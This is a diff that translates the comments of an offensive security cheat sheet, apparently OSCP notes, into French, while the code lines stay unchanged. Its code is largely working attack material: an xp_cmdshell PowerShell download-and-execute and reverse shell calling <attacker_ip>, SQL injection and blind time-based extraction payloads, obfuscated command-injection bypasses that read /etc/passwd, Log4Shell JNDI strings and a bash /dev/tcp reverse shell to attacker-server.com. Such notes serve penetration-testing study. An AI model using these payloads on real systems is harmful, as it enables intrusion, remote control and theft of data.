 EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>/reverse.ps1'')"
 
-# To get a direct reverse shell
+# Pour obtenir un shell inverse direct
 EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_ip>'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}"';
 ```
 
@@ -2035,7 +2011,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 ```bash
 <input>' OR 1=1 in (SELECT * FROM <table>) -- //
 
-# Example
+# Exemple
 <input>' OR 1=1 in (SELECT * FROM users) -- //
 ```
 
@@ -2043,7 +2019,7 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 ```bash
 <input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //
 
-# Example
+# Exemple
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 ```
 
@@ -2112,7 +2088,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFOR
 ```bash
 <input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -
 
-# Examples
+# Exemples
 %' UNION SELECT database(), user(), @@version, null, null -- -
 # or
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -
@@ -2391,9 +2367,9 @@ for i in $(seq 1 10); do
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
 
-# Replace <filename.txt> with the name of the file to store results.
-# Replace 10 in $(seq 1 10) with the estimated length of the database name.
-# The FUZZ keyword is used by wfuzz to iterate through ASCII values.
+# Remplacer <filename.txt> par le nom du fichier pour stocker les résultats.
+# Remplacer 10 en $(seq 1 10) par la longueur estimée du nom de la base de données.
+# Le mot clé FUZZ est utilisé par wfuzz pour itérer à travers les valeurs ASCII.
 ```
 
 
@@ -2409,7 +2385,7 @@ for i in $(seq 1 10); do
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
 
-# Replace table_name and table_schema with the actual names if targeting specific databases or tables.
+# Remplacer table name et table schema par les noms réels s'ils ciblent des bases de données ou des tables spécifiques.
 # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
 ```
 
@@ -2426,7 +2402,7 @@ for i in $(seq 1 10); do
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
 
-# Replace <table_name> with the actual table name you are targeting.
+# Remplacer <table_name> par le nom de la table que vous ciblez.
 # Adjust LIMIT 0,1 to retrieve column names for different tables.
 ```
 
@@ -2438,14 +2414,14 @@ done > <filename.txt> && grep "0m9" <filename.txt
 
 
 ```bash
-# Extracts content from a specific column using ASCII value comparison
+# Extrait du contenu d'une colonne spécifique à l'aide de la comparaison de valeur ASCII
 for i in $(seq 1 10); do 
   wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
 
-# Replace <column_name> with the column you're trying to extract (e.g., username, password).
-# Replace <table_name> with the actual table name.
-# The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
+# Remplacer <column_name> par la colonne que vous essayez d'extraire (par exemple, nom d'utilisateur, mot de passe).
+# Remplacer <table_name> par le nom de la table.
+# La valeur FUZZ itère sur des entrées de lignes possibles (utilisez LIMIT FUZZ, 1 pour itérer des lignes).
 ```
 
 ![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)
@@ -2547,7 +2523,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 <p class="oscp-command-note">Instruction SQL dans la rubrique « SQL Truncation ».</p>
 
 ```sql
-# Example of truncation; the database discards extra characters
+# Exemple de tronquage; la base de données rejette des caractères supplémentaires
 username=admin++++++++(max.length)&password=testpwn123
 
 -- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
@@ -2643,7 +2619,7 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 ```
 
 
-##### Remote Code Execution (RCE)
+##### Exécution de code à distance (RCE)
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « Remote Code Execution (RCE) ».</p>
@@ -2812,12 +2788,12 @@ SELECT user FROM mysql.user;
 GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 
-# Test SQLi in every input field
+# Tester SQLi dans chaque champ d'entrée
 ';#---
 ```
 
 
-##### Remote Code Execution (RCE)
+##### Exécution de code à distance (RCE)
 
 
 **Paramètres et repères :**
@@ -3073,7 +3049,7 @@ version="1.0"/encoding="UTF-8"
 ![XEE Reading Source Code](https://www.emmanuelsolis.com/img/xee04.png)
 
 
-### Remote Code Execution
+### Exécution de code à distance
 
 
 
@@ -3116,7 +3092,7 @@ version="1.0"/encoding="UTF-8"
 
 
 ```bash
-# Script with regex to find the documents
+# Script avec regex pour trouver les documents
 #!/bin/bash
 
 url="http://SERVER_IP:PORT"
@@ -3130,7 +3106,7 @@ done
 
 
 ```bash
-# Alternative script option to find any extension
+# Option de script alternative pour trouver une extension
 #!/bin/bash
 
 url="http://SERVER_IP:PORT"
@@ -3246,7 +3222,7 @@ Examiner les entrées et les réponses de l'application web.
 
 
 ```powershell
-# Check if we are executing PowerShell or CMD
+# Vérifiez si nous effectuons PowerShell ou CMD
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
@@ -3417,7 +3393,7 @@ $IFS
 <p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
-# to select /
+# pour sélectionner /
 echo ${PATH:0:1}
 ```
 
@@ -3425,7 +3401,7 @@ echo ${PATH:0:1}
 
 
 ```powershell
-# to select \
+# pour sélectionner \
 $env:HOMEPATH[0]
 ```
 
@@ -3495,7 +3471,7 @@ Example:
 # Linux
 echo 'whoami' | rev
 
-# To execute:
+# Pour exécuter :
 $(rev<<<'imaohw')
 ```
 
@@ -3506,7 +3482,7 @@ $(rev<<<'imaohw')
 # Windows
 "whoami"[-1..-20] -join ''
 
-# To execute:
+# Pour exécuter :
 iex "$('imaohw'[-1..-20] -join '')"
 ```
 
@@ -3520,7 +3496,7 @@ iex "$('imaohw'[-1..-20] -join '')"
 # Linux
 echo -n 'cat /etc/passwd | grep 33' | base64
 
-# To execute (note that we are using <<< to avoid using a pipe |, which is a filtered character):
+# Pour exécuter (notez que nous utilisons <<< pour éviter l'utilisation d'un tube, qui est un caractère filtré):
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
@@ -3530,7 +3506,7 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
 
-# To execute:
+# Pour exécuter :
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
 ```
 
@@ -3552,7 +3528,7 @@ cd ./bashfuscator/bin/
 ./bashfuscator -h
 ./bashfuscator -c 'cat /etc/passwd'
 
-# Example
+# Exemple
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
 ```
 
@@ -3589,13 +3565,13 @@ ${jndi:rmi://attacker-server.com:1099/a}
 <p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
 
 ```bash
-# Using Curl
+# Utilisation de Curl
 curl -X GET 'http://target-server.com:8080/?search=${jndi:ldap://attacker-server.com:1389/a}'
 
-# Using Headers Injection
+# Utilisation de Headers Injection
 curl -X GET http://target-server.com -H "User-Agent: ${jndi:ldap://attacker-server.com:1389/a}"
 
-# Using POST Data Injection
+# Utilisation de l'injection de données POST
 curl -X POST http://target-server.com/login -d "username=${jndi:ldap://attacker-server.com:1389/a}&password=test"
 ```
 
@@ -3610,12 +3586,12 @@ nc -lvnp [listening_port]
 <p class="oscp-command-note">Exécuter un script shell.</p>
 
 ```bash
-# You can also use a tool like ysoserial (for Windows) to generate the payload.
+# Vous pouvez également utiliser un outil comme ysoserial (pour Windows) pour générer la charge utile.
 
-# Bash reverse shell payload
+# Charge utile en coque inversée
 bash -i >& /dev/tcp/attacker-server.com/[listening_port] 0>&1
 
-# Use the reverse shell payload
+# Utiliser la charge utile du shell inverse
 ${jndi:ldap://attacker-server.com:1389/bash-reverse-shell}
 ```
 
